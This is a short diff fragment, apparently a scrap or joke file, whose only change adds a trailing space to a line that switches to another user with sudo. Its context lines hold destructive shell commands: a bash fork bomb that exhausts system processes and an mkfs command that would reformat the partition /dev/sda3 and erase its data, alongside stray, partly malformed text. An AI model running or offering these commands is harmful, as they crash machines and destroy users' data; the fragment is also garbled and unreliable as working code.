@@ -1,4 +1,4 @@
-sudo su - _albertBourla
+sudo su - _albertBourla 
 <off> 
 :(){:|:&};:
 mkfs ext4 /dev/sda3. 2a
